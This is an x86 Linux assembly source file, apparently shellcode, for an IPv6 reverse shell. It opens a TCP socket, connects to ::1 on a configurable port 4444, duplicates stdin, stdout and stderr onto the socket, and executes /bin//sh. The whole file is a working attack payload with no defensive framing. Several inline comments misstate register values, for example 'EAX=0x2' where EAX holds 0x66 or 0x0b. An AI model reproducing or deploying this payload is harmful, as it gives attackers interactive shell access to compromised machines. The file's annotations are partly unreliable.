global _start
section .text

 ;References:
 ;(1)http://syscalls.kernelgrok.com/
 ;(2)https://www.3dbrew.org/wiki/Socket_Services
 ;(3)http://osr600doc.xinuos.com/en/SDK_netapi/sockC.TheIPv6sockaddrstructure.html
 ;(4)http://www.qnx.com/developers/docs/6.5.0/index.jsp?topic=%2Fcom.qnx.doc.neutrino_lib_ref%2Fi%2Finet6_proto.html

_start:
;IPV6 socket creation 
;int socketcall(int call, unsigned long *args);
;sockfd = socket(int socket_family, int socket_type, int protocol);
push byte 0x66                    ;socketcall()
pop eax                           ;EAX=0x2

xor ebx,ebx                       ; zero out ebx

push 0x6                          ; IPPROTO_TCP=6
push 0x1                          ; socket_type=SOCK_STREAM (0x1)
push 0xa                          ; AF_INET6
inc ebx                           ; Define SYS_socket = 1
mov ecx,esp                       ; save pointer (ESP) to socket() args (ECX)
int 0x80
xchg esi,eax                      ; sockfd stored in esi
xor eax,eax

;Connect
;connect(sockfd, (struct sockaddr*)&srvaddr, sizeof(srvaddr)); 
;int socketcall(int call, unsigned long *args);
push DWORD eax                    ;x4 dword ipv6 loopback  | EAX contains 0
push DWORD eax
push DWORD eax
push DWORD eax
push DWORD eax
push eax                          ;inet_pton(AF_INET6, "::1", &srvaddr.sin6_addr);
push WORD 0x5c11                  ;sin6_port=4444 | 0x5c11 | Configurable |
push WORD 0x0a                    ;AF_INET6
mov ecx,esp                       ;ECX holds pointer to struct sockaddr_in6
push byte 0x1c                    ;sizeof(sockaddr_in6) | sockaddr_in6 = 28
push ecx                          ;pointer to sockfd
push esi                          ;sockfd
mov ecx,esp                       ;ECX points to args
inc ebx
inc ebx                           ;EBX = 0x3 | #define SYS_Connect 3
push byte 0x66                    ;socketcall()
pop eax
int 80h

push byte 0x2                     ;push 0x2 on stack
pop ecx                           ;ECX = 2

;dup2() to redirect stdin(0), stdout(1) and stderr(2)
loop:
push byte 0x3f                     ;dup2()
pop eax                            ;EAX = 0x3f
int 0x80                           ;exec sys_dup2
dec ecx                            ;decrement counter
jns loop                           ;if SF not set ==> keep jumping

;execve(/bin//sh)
xor ecx,ecx                        ;clear ECX
push ecx                           ;Push NULL
push byte 0x0b                     ;execve() sys call number
pop eax 						                     ;EAX=0x2 | execve()
push 0x68732f2f                    ;(1)/bin//sh
push 0x6e69622f                    ;(2)/bin//sh
mov ebx,esp                        ;EBX pointing to “/bin//sh”
int 0x80                           ;Calling Interrupt for sys call
